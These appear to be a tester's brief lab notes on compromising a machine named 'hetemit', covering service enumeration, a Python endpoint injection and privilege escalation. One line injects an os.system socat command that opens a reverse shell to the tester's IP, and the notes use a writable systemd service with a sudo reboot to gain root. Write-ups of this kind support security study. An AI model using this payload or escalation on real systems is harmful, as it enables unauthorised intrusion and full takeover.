_____

> [!info]
> IP=192.168.188.117


# SMB

Cmeeks                                                  NO ACCESS       cmeeks Files


# 80
gobuster -- nothing

# 18000

![[Pasted image 20240222114839.png]]

`Rails.root: /home/cmeeks/register_hetemit`


# 50000
python

/generate
/verify

![[Pasted image 20240222120107.png]]

![[Pasted image 20240222120125.png]]


```**python**
code=os.system('socat+TCP:192.168.45.214:80+EXEC:sh')
```


# PrivEsc

writable

/etc/systemd/system/pythonapp.service

![[Pasted image 20240222162759.png]]

```txt
User cmeeks may run the following commands on hetemit:
    (root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
```

> # As “services” require restarted/system reboot to refresh whatever changes we made to the service app, we type “sudo /sbin/reboot” and system was rebooted


